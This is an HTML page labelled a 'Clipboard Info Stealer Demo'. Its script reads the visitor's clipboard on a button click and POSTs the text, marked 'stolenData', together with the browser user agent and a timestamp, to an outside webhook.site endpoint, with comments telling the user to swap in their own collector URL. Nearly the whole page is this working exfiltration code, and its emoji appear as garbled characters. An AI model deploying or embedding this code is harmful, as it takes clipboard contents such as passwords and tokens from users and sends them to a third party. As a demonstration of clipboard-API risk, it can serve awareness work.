<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Clipboard POST Demo</title>
</head>
<body>
  <h1>üö® Clipboard Info Stealer Demo</h1>
  <button onclick="stealClipboard()">Read & POST Clipboard</button>
  <pre id="output"></pre>

  <script>
    async function stealClipboard() {
      const output = document.getElementById("output");

      try {
        const data = await navigator.clipboard.readText();
        output.textContent = "üìã Clipboard:\n" + data;

        const payload = {
          stolenData: data,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        // ‚úÖ Replace this with your Beeceptor endpoint
        const webhookURL = "https://webhook.site/12c74b14-80e6-4bce-9678-184713c0058c"; // ‚Üê Replace this line

        const response = await fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        output.textContent += `\n\n‚úÖ POST sent to Beeceptor\nStatus: ${response.status}`;
      } catch (err) {
        output.textContent += `\n\n‚ùå Error: ${err}`;
        console.error("Fetch error:", err);
      }
    }
  </script>
</body>
</html>
